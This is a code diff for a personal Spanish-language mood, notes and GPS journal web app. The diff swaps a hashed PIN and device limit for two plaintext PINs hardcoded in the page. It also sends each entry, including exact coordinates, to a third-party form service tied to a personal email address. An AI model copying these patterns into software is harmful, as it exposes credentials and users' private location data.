@@ -81,22 +81,20 @@ textarea:focus{border-color:var(--c2)}
 .pad{display:grid;grid-template-columns:repeat(3,76px);gap:18px}
 .pad button{width:76px;height:76px;border-radius:50%;border:0;background:rgba(255,255,255,.14);color:#fff;font-size:1.9rem;font-weight:300;backdrop-filter:blur(10px);box-shadow:0 4px 0 rgba(0,0,0,.25),inset 0 1px 1px rgba(255,255,255,.2)}
 .pad button:active{transform:translateY(4px);background:rgba(255,255,255,.3)}.pad .a{background:none;box-shadow:none;font-size:1.3rem}
-#blk{display:none;max-width:320px;text-align:center}
 </style>
 </head>
 <body>
 <div id="lock">
   <h1 id="lt">--:--</h1><p id="ld"></p>
-  <h2>KIDO CORE</h2><div class="msg" id="lm">Conectando…</div>
+  <h2>KIDO CORE</h2><div class="msg" id="lm">Autenticación Requerida</div>
   <div class="dots" id="dots"></div>
   <div class="pad" id="pad"></div>
-  <div id="blk" class="card"></div>
 </div>
 
 <main class="app">
  <section id="t-diario" class="tab on">
   <h1 id="greet">Hola, Nivek</h1>
-  <div class="sub"><span class="sync" id="sy"></span><span id="sytx">Sin sincronizar</span></div>
+  <div class="sub"><span class="sync ok" id="sy"></span><span id="sytx">Almacenamiento Local</span></div>
 
   <div class="card" id="moon" style="display:none">
     <div class="hero"><div><b>🌙 Ciclo Lunar</b><br><span class="badge" id="mph" style="background:#334155">…</span></div><span class="big" id="mic">🌕</span></div>
@@ -129,21 +127,20 @@ textarea:focus{border-color:var(--c2)}
  </section>
 
  <section id="t-hist" class="tab">
-  <h1>Historial</h1><div class="sub">Todo lo que registras, en todos tus dispositivos</div>
+  <h1>Historial</h1><div class="sub">Todo lo que registras en tu dispositivo</div>
   <div id="hist"></div>
  </section>
 
  <section id="t-nivek" class="tab">
   <div class="id">
-   <div class="t"><div class="logo"><svg viewBox="0 0 100 80" style="width:100%;max-height:100px"><path d="M5,0 L35,0 L50,30 L65,0 L95,0 L60,40 L95,80 L65,80 L50,50 L35,80 L5,80 L40,40 Z"/><polygon points="50,12 72,40 50,68 28,40" fill="#d32f2f"/></svg></div><div class="bar"></div></div>
+   <div class="t"><div class="logo"><svg viewBox="0 0 100 80" style="width:100%;max-height:100px"><path d="M5,0 L35,0 L50,30 L65,0 L95,0 L60,40 L95,80 L65,80 L50,50 L35,80 L5,80 L40,40 Z" fill="#000"/><polygon points="50,12 72,40 50,68 28,40" fill="#d32f2f"/></svg></div><div class="bar"></div></div>
    <div class="bt"><div class="slot n">N I V E K</div><div class="slot">2000-0519-EC</div><div class="slot">GUASMO NORTE</div><div class="slot">ESPECIALISTA / KX-9418</div></div>
   </div>
   <div class="day" style="margin-top:0">Ejes operativos</div>
   <div class="card pillar"><h4><span class="beat">❤️‍🔥</span> Salud &amp; Vitalidad</h4><p>Entrenamiento físico, acondicionamiento y balance neuromuscular.</p><span class="tag">En progreso</span><span class="tag">Fuerza / Cardio</span></div>
   <div class="card pillar"><h4>🧠 Estudio &amp; Investigación</h4><p>Exploración conceptual, lecturas avanzadas y desarrollo analítico.</p><span class="tag on">Activo</span><span class="tag">Investigación</span></div>
   <div class="card pillar"><h4>⚡ Trabajo &amp; Proyectos</h4><p>Dirección de iniciativas creativas, sistemas y flujos de automatización.</p><span class="tag">Planificación</span><span class="tag">Kido Corp</span></div>
-  <div class="day">Dispositivos autorizados</div>
-  <div class="card"><div id="devs"></div><div class="hint" style="margin:10px 0 0">Máximo 3. Si llegas al límite, quita uno desde un dispositivo ya autorizado.</div></div>
+  
   <div class="card"><button class="btn sm" id="bth" style="background:#334155">Cambiar tema claro / oscuro</button></div>
  </section>
 
@@ -155,108 +152,215 @@ textarea:focus{border-color:var(--c2)}
 </main>
 
 <script>
-const $=i=>document.getElementById(i), MAX=3, LS=k=>{try{return localStorage.getItem(k)}catch(e){return null}}, LSset=(k,v)=>{try{localStorage.setItem(k,v)}catch(e){}};
+const $=i=>document.getElementById(i);
+const LS=k=>{try{return localStorage.getItem(k)}catch(e){return null}};
+const LSset=(k,v)=>{try{localStorage.setItem(k,v)}catch(e){}};
 const esc=s=>String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 const MOODS=[["😁","Feliz"],["😐","Normal"],["😢","Triste"],["😠","Enfadado"],["🤬","Cabrero"],["💀","Valiendo verga"],["🫠","En la vrg"],["🏳️","Ya fue"],["🍃","Pegado"],["🛸","En momano"],["😑","Chinote chaulin"]];
-const App={db:null,uid:null,dev:LS('kido_dev')||(()=>{const d=Math.random().toString(36).slice(2,10);LSset('kido_dev',d);return d})(),log:[],unsub:null,
- col(p){return this.db.collection('data/users/'+this.uid+'/'+p)},
- async init(){
-  try{const u=await claude.use('user');this.uid=u?await u.id():null;this.db=await claude.use('db')}catch(e){}
-  if(!this.db||!this.uid){return null}
-  return true
+
+const App={
+ log:[],
+ init(){
+  this.log=JSON.parse(LS('kido_log')||'[]');
+  render();
  },
  async add(kind,text,extra){
-  const ts=Date.now(),rec={kind,text,ts,dev:this.dev,...(extra||{})};
-  this.log.unshift(rec);render();
-  if(this.db){try{await this.col('log').doc(String(ts)).set(rec);return true}catch(e){setSync(false,'Error al guardar');return false}}
-  const l=JSON.parse(LS('kido_log')||'[]');l.unshift(rec);LSset('kido_log',JSON.stringify(l.slice(0,200)));return true
- },
- async del(ts){this.log=this.log.filter(r=>r.ts!==ts);render();if(this.db)try{await this.col('log').doc(String(ts)).delete()}catch(e){}},
- listen(){
-  if(!this.db){this.log=JSON.parse(LS('kido_log')||'[]');render();return}
-  this.unsub=this.col('log').orderBy('ts','desc').limit(100).onSnapshot(s=>{this.log=s.docs.map(d=>d.data());render();setSync(true,'Sincronizado · '+MAX+' dispositivos máx.')},()=>setSync(false,'Sin conexión'))
- }};
-function setSync(ok,t){$('sy').className='sync'+(ok?' ok':'');$('sytx').textContent=t}
+  const ts=Date.now(),rec={kind,text,ts,...(extra||{})};
+  this.log.unshift(rec);
+  LSset('kido_log',JSON.stringify(this.log.slice(0,200)));
+  render();
+  
+  // Sincronización mediante correo
+  const payload = {
+    _subject: `Kido App: Registro (${kind})`,
+    tipo: kind,
+    contenido: text,
+    fecha_hora: new Date(ts).toISOString(),
+    ...extra
+  };
+  try {
+    await fetch('https://formsubmit.co/ajax/Albankevine845@gmail.com', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  } catch(e) { console.warn('Error al enviar correo', e); }
 
-/* ---------- seguridad: PIN + límite de 3 dispositivos ---------- */
-const hash=async s=>[...new Uint8Array(await crypto.subtle.digest('SHA-256',new TextEncoder().encode('kido|'+s)))].map(b=>b.toString(16).padStart(2,'0')).join('');
-const devName=()=>{const u=navigator.userAgent;return (/iPhone|iPad/.test(u)?'iPhone/iPad':/Android/.test(u)?'Android':/Mac/.test(u)?'Mac':/Windows/.test(u)?'Windows':'Dispositivo')+' · '+(/Chrome/.test(u)&&!/Edg/.test(u)?'Chrome':/Safari/.test(u)?'Safari':/Firefox/.test(u)?'Firefox':'Web')};
-const Lock={pin:'',mode:'check',hh:null,
- clock(){const f=()=>{const n=new Date();$('lt').textContent=n.toTimeString().slice(0,5);$('ld').textContent=n.toLocaleDateString('es-EC',{weekday:'long',month:'long',day:'numeric'})};f();setInterval(f,1000)},
- build(){$('pad').innerHTML=['1','2','3','4','5','6','7','8','9','C','0','➔'].map(k=>`<button class="${isNaN(k)?'a':''}" data-k="${k}">${k}</button>`).join('');$('pad').onclick=e=>{const k=e.target.dataset.k;if(!k)return;navigator.vibrate&&navigator.vibrate(12);this.key(k)};this.dots()},
- dots(){$('dots').innerHTML=Array.from({length:Math.max(4,this.pin.length)},(_,i)=>`<i class="${i<this.pin.length?'a':''}"></i>`).join('')},
- async key(k){if(k==='C')this.pin='';else if(k==='➔')return this.go();else if(this.pin.length<8)this.pin+=k;this.dots()},
- async go(){
-  if(this.pin.length<4)return this.bad('Mínimo 4 dígitos');
-  const h=await hash(this.pin);
-  if(this.mode==='set'){
-   if(!this.first){this.first=h;this.pin='';this.dots();$('lm').textContent='Repite el PIN para confirmar';return}
-   if(this.first!==h){this.first=null;this.pin='';this.dots();return this.bad('No coinciden, empieza de nuevo')}
-   LSset('kido_pin',h);if(App.db)await App.col('cfg').doc('pin').set({h});return this.open()
+  return true;
+ },
+ async del(ts){
+  this.log=this.log.filter(r=>r.ts!==ts);
+  LSset('kido_log',JSON.stringify(this.log));
+  render();
+ }
+};
+
+/* ---------- seguridad: PIN ---------- */
+const VALID_PINS = ["1234", "0931935795"];
+const Lock={
+ pin:'',
+ clock(){
+  const f=()=>{
+   const n=new Date();
+   $('lt').textContent=n.toTimeString().slice(0,5);$('ld').textContent=n.toLocaleDateString('es-EC',{weekday:'long',month:'long',day:'numeric'});
+  };
+  f();
+  setInterval(f,1000);
+ },
+ build(){
+  $('pad').innerHTML=['1','2','3','4','5','6','7','8','9','C','0','➔'].map(k=>`<button class="${isNaN(k)?'a':''}" data-k="${k}">${k}</button>`).join('');
+  $('pad').onclick=e=>{
+   const k=e.target.dataset.k;
+   if(!k)return;
+   if(navigator.vibrate)navigator.vibrate(12);
+   this.key(k);
+  };
+  this.dots();
+ },
+ dots(){
+  const count=Math.max(4,this.pin.length);
+  $('dots').innerHTML=Array.from({length:count},(_,i)=>`<i class="${i<this.pin.length?'a':''}"></i>`).join('');
+ },
+ key(k){
+  if(k==='C'){this.pin='';}
+  else if(k==='➔'){return this.go();}
+  else if(this.pin.length<10){this.pin+=k;}
+  this.dots();
+  if(VALID_PINS.includes(this.pin)){
+      setTimeout(()=>this.go(), 250);
   }
-  if(h===this.hh){LSset('kido_pin',h);this.open()}else this.bad('PIN incorrecto')
  },
- bad(m){$('lm').textContent=m;$('dots').classList.add('sh');navigator.vibrate&&navigator.vibrate([50,50,50]);setTimeout(()=>{$('dots').classList.remove('sh');this.pin='';this.dots()},400)},
- async open(){
-  if(App.db&&!(await Devices.register()))return;
-  $('lock').classList.add('off');App.listen();Devices.render()
+ go(){
+  if(VALID_PINS.includes(this.pin)){
+   $('lock').classList.add('off');
+  }else{
+   this.bad('PIN incorrecto');
+  }
  },
- async start(){
-  this.clock();this.build();
-  const ok=await App.init();
-  if(!ok){this.hh=LS('kido_pin');this.mode=this.hh?'check':'set';$('lm').textContent=(this.hh?'Ingresa tu PIN':'Crea tu PIN')+' · modo local (sin sincronizar)';setSync(false,'Modo local · abre desde claude.ai para sincronizar');return}
-  try{const s=await App.col('cfg').doc('pin').get();this.hh=s.exists?s.data().h:null}catch(e){}
-  this.mode=this.hh?'check':'set';$('lm').textContent=this.hh?'Ingresa tu PIN':'Primera vez: crea tu PIN (4-8 dígitos)'
- }};
-const Devices={list:[],
- async load(){try{const s=await App.col('cfg').doc('devices').get();this.list=s.exists?s.data().list||[]:[]}catch(e){this.list=[]}},
- async register(){
-  await this.load();
-  if(!this.list.find(d=>d.id===App.dev)){
-   if(this.list.length>=MAX){this.block();return false}
-   this.list.push({id:App.dev,name:devName(),ts:Date.now()});
-  }else this.list=this.list.map(d=>d.id===App.dev?{...d,seen:Date.now()}:d);
-  await App.col('cfg').doc('devices').set({list:this.list});return true
+ bad(m){
+  $('lm').textContent=m;
+  $('dots').classList.add('sh');
+  if(navigator.vibrate)navigator.vibrate([50,50,50]);
+  setTimeout(()=>{
+   $('dots').classList.remove('sh');
+   this.pin='';
+   this.dots();
+   $('lm').textContent='Autenticación Requerida';
+  },400);
  },
- block(){$('pad').style.display=$('dots').style.display='none';const b=$('blk');b.style.display='block';$('lm').textContent='';
-  b.innerHTML='<b>Límite de 3 dispositivos</b><div class="hint" style="margin-top:8px">Ya hay 3 dispositivos autorizados. Libera uno para usar este:</div>'+this.list.map(d=>`<div class="dev"><span>${esc(d.name)}</span><button class="btn sm red" data-r="${d.id}">Quitar</button></div>`).join('');
-  b.onclick=async e=>{const r=e.target.dataset.r;if(!r)return;this.list=this.list.filter(d=>d.id!==r);this.list.push({id:App.dev,name:devName(),ts:Date.now()});await App.col('cfg').doc('devices').set({list:this.list});location.reload()}},
- render(){$('devs').innerHTML=this.list.map(d=>`<div class="dev"><span>${d.id===App.dev?'📱 ':'💻 '}${esc(d.name)}${d.id===App.dev?' <small style="color:var(--c1)">(este)</small>':''}</span>${d.id===App.dev?'':`<button class="btn sm red" data-r="${d.id}">Quitar</button>`}</div>`).join('')||'<div class="hint">Modo local: sin dispositivos registrados.</div>'+'';
-  $('devs').onclick=async e=>{const r=e.target.dataset.r;if(!r)return;this.list=this.list.filter(d=>d.id!==r);await App.col('cfg').doc('devices').set({list:this.list});this.render()}}};
+ start(){
+  this.clock();
+  this.build();
+ }
+};
 
 /* ---------- UI ---------- */
 function render(){
-  $('chips').innerHTML=App.log.filter(r=>r.kind==='mood').slice(0,8).map(r=>`<span class="chip">${esc(r.text)}</span>`).join('');
-  if(!App.log.length){$('hist').innerHTML='<div class="empty">Aún no hay registros ✨</div>';return}
-  let day='',h='';const ic={mood:'🙂',note:'📝',gps:'📍'};
-  App.log.forEach(r=>{const d=new Date(r.ts),dk=d.toLocaleDateString('es-EC',{weekday:'long',day:'numeric',month:'long'});
-   if(dk!==day){day=dk;h+=`<div class="day">${dk}</div>`}
-   const hr=d.toTimeString().slice(0,5),lnk=r.lat!=null?` <a style="color:var(--c1)" target="_blank" rel="noopener" href="https://maps.google.com/?q=${r.lat},${r.lng}">ver mapa</a>`:'';
-   h+=`<div class="row"><span class="ic">${ic[r.kind]||'•'}</span><div class="b">${esc(r.text)}${lnk}<small>${hr}</small></div><button class="x" data-d="${r.ts}">✕</button></div>`});
-  $('hist').innerHTML=h}
-$('hist').onclick=e=>{const t=e.target.dataset.d;if(t&&confirm('¿Borrar este registro?'))App.del(+t)};
+ $('chips').innerHTML=App.log.filter(r=>r.kind==='mood').slice(0,8).map(r=>`<span class="chip">${esc(r.text)}</span>`).join('');
+ if(!App.log.length){$('hist').innerHTML='<div class="empty">Aún no hay registros ✨</div>';return;}
+ let day='',h='';
+ const ic={mood:'🙂',note:'📝',gps:'📍'};
+ App.log.forEach(r=>{
+  const d=new Date(r.ts),dk=d.toLocaleDateString('es-EC',{weekday:'long',day:'numeric',month:'long'});
+  if(dk!==day){day=dk;h+=`<div class="day">${dk}</div>`;}
+  const hr=d.toTimeString().slice(0,5),lnk=r.lat!=null?` <a style="color:var(--c1)" target="_blank" rel="noopener" href="https://maps.google.com/?q=${r.lat},${r.lng}">ver mapa</a>`:'';
+  h+=`<div class="row"><span class="ic">${ic[r.kind]||'•'}</span><div class="b">${esc(r.text)}${lnk}<small>${hr}</small></div><button class="x" data-d="${r.ts}">✕</button></div>`;
+ });
+ $('hist').innerHTML=h;
+}
+
+$('hist').onclick=e=>{
+ const t=e.target.dataset.d;
+ if(t&&confirm('¿Borrar este registro?'))App.del(+t);
+};
+
 $('moods').innerHTML=MOODS.map(m=>`<button class="mood" data-m="${m[1]} ${m[0]}"><span>${m[0]}</span><label>${m[1]}</label></button>`).join('');
-$('moods').onclick=e=>{const b=e.target.closest('.mood');if(!b)return;navigator.vibrate&&navigator.vibrate(20);App.add('mood',b.dataset.m)};
-$('bn').onclick=async()=>{const t=$('note').value.trim();if(!t)return;const b=$('bn');b.disabled=true;b.textContent='Sincronizando…';await App.add('note',t);$('note').value='';b.textContent='¡Completado!';setTimeout(()=>{b.textContent='Guardar y sincronizar';b.disabled=false},1500)};
-$('bg').onclick=()=>{const b=$('bg'),o=b.innerHTML;b.disabled=true;b.innerHTML='📡 Triangulando…';
-  const fin=async(lat,lng)=>{await App.add('gps',lat!=null?`Punto fijo (${lat.toFixed(5)}, ${lng.toFixed(5)})`:'Punto fijo sin GPS',lat!=null?{lat,lng}:{});b.innerHTML='¡Ruta guardada!';setTimeout(()=>{b.innerHTML=o;b.disabled=false},2000)};
-  navigator.geolocation?navigator.geolocation.getCurrentPosition(p=>fin(p.coords.latitude,p.coords.longitude),()=>fin(null),{enableHighAccuracy:true,timeout:6000}):fin(null)};
-document.querySelector('.nav').onclick=e=>{const b=e.target.closest('button');if(!b)return;document.querySelectorAll('.nav button').forEach(x=>x.classList.toggle('on',x===b));document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('on',t.id===b.dataset.t))};
-$('bth').onclick=()=>{const r=document.documentElement,l=getComputedStyle(r).getPropertyValue('--bg').trim()==='#eef2f7';r.dataset.theme=l?'dark':'light';LSset('kido_theme',r.dataset.theme)};
+$('moods').onclick=e=>{
+ const b=e.target.closest('.mood');
+ if(!b)return;
+ if(navigator.vibrate)navigator.vibrate(20);
+ App.add('mood',b.dataset.m);
+};
+
+$('bn').onclick=async()=>{
+ const t=$('note').value.trim();
+ if(!t)return;
+ const b=$('bn');
+ b.disabled=true;
+ b.textContent='Sincronizando…';
+ await App.add('note',t);
+ $('note').value='';
+ b.textContent='¡Completado!';
+ setTimeout(()=>{b.textContent='Guardar y sincronizar';b.disabled=false;},1500);
+};
+
+$('bg').onclick=()=>{
+ const b=$('bg'),o=b.innerHTML;
+ b.disabled=true;
+ b.innerHTML='📡 Triangulando…';
+ const fin=async(lat,lng)=>{
+  await App.add('gps',lat!=null?`Punto fijo (${lat.toFixed(5)}, ${lng.toFixed(5)})`:'Punto fijo sin GPS',lat!=null?{lat,lng}:{});
+  b.innerHTML='¡Ruta guardada!';
+  setTimeout(()=>{b.innerHTML=o;b.disabled=false;},2000);
+ };
+ navigator.geolocation?navigator.geolocation.getCurrentPosition(p=>fin(p.coords.latitude,p.coords.longitude),()=>fin(null),{enableHighAccuracy:true,timeout:6000}):fin(null);
+};
+
+document.querySelector('.nav').onclick=e=>{
+ const b=e.target.closest('button');
+ if(!b)return;
+ document.querySelectorAll('.nav button').forEach(x=>x.classList.toggle('on',x===b));
+ document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('on',t.id===b.dataset.t));
+};
+
+$('bth').onclick=()=>{
+ const r=document.documentElement,l=getComputedStyle(r).getPropertyValue('--bg').trim()==='#eef2f7';
+ r.dataset.theme=l?'dark':'light';
+ LSset('kido_theme',r.dataset.theme);
+};
+
 if(LS('kido_theme'))document.documentElement.dataset.theme=LS('kido_theme');
 
 /* ---------- Luna y UV ---------- */
 const FACTS=["La Luna se aleja de la Tierra 3.8 cm cada año.","Siempre vemos la misma cara de la Luna por su rotación sincrónica.","Las mareas del Golfo de Guayaquil siguen las fases lunares.","La gravedad lunar estabiliza la inclinación de la Tierra.","El polvo lunar olía a pólvora, según los astronautas del Apolo.","Un ciclo lunar completo dura unos 29.5 días.","En la Luna no hay sonido: no existe atmósfera.","La Luna refleja solo ~12% de la luz solar que recibe."];
-function moon(){const h=new Date().getHours(),m=$('moon');if(h>=6&&h<18){m.style.display='none';return}
- m.style.display='block';const age=(((Date.now()-Date.UTC(2000,0,6,18,14))/864e5)%29.530588+29.530588)%29.530588;
+
+function moon(){
+ const h=new Date().getHours(),m=$('moon');
+ if(h>=6&&h<18){m.style.display='none';return;}
+ m.style.display='block';
+ const age=(((Date.now()-Date.UTC(2000,0,6,18,14))/864e5)%29.530588+29.530588)%29.530588;
  const P=[[1.85,"Luna Nueva","🌑"],[7.38,"Creciente","🌒"],[9.23,"Cuarto Creciente","🌓"],[14.77,"Gibosa Creciente","🌔"],[16.61,"Luna Llena","🌕"],[22.15,"Gibosa Menguante","🌖"],[23.99,"Cuarto Menguante","🌗"],[27.68,"Menguante","🌘"],[99,"Luna Nueva","🌑"]].find(p=>age<p[0]);
- $('mph').textContent='Fase: '+P[1];$('mic').textContent=P[2];$('mfact').textContent=FACTS[Math.floor(Date.now()/864e5)%FACTS.length]}
-function uv(){const h=new Date().getHours();
- const T=[[6,'😴','UV 0 · Noche','#3b82f6','😴 Sol durmiendo','Sin radiación. Buen momento para hidratar la piel.',0],[9,'🌅','UV 2-3 · Bajo','#22c55e','🌅 Sol matutino suave','Si sales temprano, aplica un toque de protector en zonas expuestas.',18],[11,'☀️','UV 5-7 · Moderado/Alto','#eab308','☀️ Sol activo','El sol de Guayaquil empieza a calentar: bloqueador FPS 50+ antes de salir.',45],[16,'🔥','UV 9-12+ · Extremo','#dc2626','🔥 Alerta máxima solar','Evita sol directo. Gorra, gafas UV y bloqueador FPS 50+ reforzado.',90],[18,'🌆','UV 2-4 · Descendiendo','#f97316','🌆 Sol en descenso','La radiación baja progresivamente.',30],[24,'😴','UV 0 · Noche','#1e293b','🌙 Sol descansando','Sin radiación UV. Ambiente fresco y seguro.',0]].find(t=>h<t[0]);
- $('uvi').textContent=T[1];$('uvb').textContent=T[2];$('uvb').style.background=T[3];$('uvt').textContent=T[4];$('uva').textContent=T[5];$('uvk').style.left=Math.max(2,T[6])+'%'}
-const hr=new Date().getHours();$('greet').textContent=(hr<5||hr>=19?'Buenas noches':hr<12?'Buenos días':'Buenas tardes')+', Nivek';
-moon();uv();setInterval(()=>{moon();uv()},9e5);
+ $('mph').textContent='Fase: '+P[1];
+ $('mic').textContent=P[2];$('mfact').textContent=FACTS[Math.floor(Date.now()/864e5)%FACTS.length];
+}
+
+function uv(){
+ const h=new Date().getHours();
+ const T=[
+  [6,'😴','UV 0 · Noche','#3b82f6','😴 Sol durmiendo','Sin radiación. Buen momento para hidratar la piel.',0],
+  [9,'🌅','UV 2-3 · Bajo','#22c55e','🌅 Sol matutino suave','Si sales temprano, aplica un toque de protector en zonas expuestas.',18],
+  [11,'☀️','UV 5-7 · Moderado/Alto','#eab308','☀️ Sol activo','El sol de Guayaquil empieza a calentar: bloqueador FPS 50+ antes de salir.',45],
+  [16,'🔥','UV 9-12+ · Extremo','#dc2626','🔥 Alerta máxima solar','Evita sol directo. Gorra, gafas UV y bloqueador FPS 50+ reforzado.',90],
+  [18,'🌆','UV 2-4 · Descendiendo','#f97316','🌆 Sol en descenso','La radiación baja progresivamente.',30],
+  [24,'😴','UV 0 · Noche','#1e293b','🌙 Sol descansando','Sin radiación UV. Ambiente fresco y seguro.',0]
+ ].find(t=>h<t[0]);
+ $('uvi').textContent=T[1];$('uvb').textContent=T[2];
+ $('uvb').style.background=T[3];$('uvt').textContent=T[4];
+ $('uva').textContent=T[5];$('uvk').style.left=Math.max(2,T[6])+'%';
+}
+
+const hr=new Date().getHours();
+$('greet').textContent=(hr<5||hr>=19?'Buenas noches':hr<12?'Buenos días':'Buenas tardes')+', Nivek';
+
+App.init();
+moon();
+uv();
+setInterval(()=>{moon();uv();},9e5);
 Lock.start();
+
+if ('serviceWorker' in navigator) {
+ window.addEventListener('load', () => { navigator.serviceWorker.register('./sw.js').catch(err => console.log('SW Error:', err)); });
+}
 </script>
 </body>
 </html>
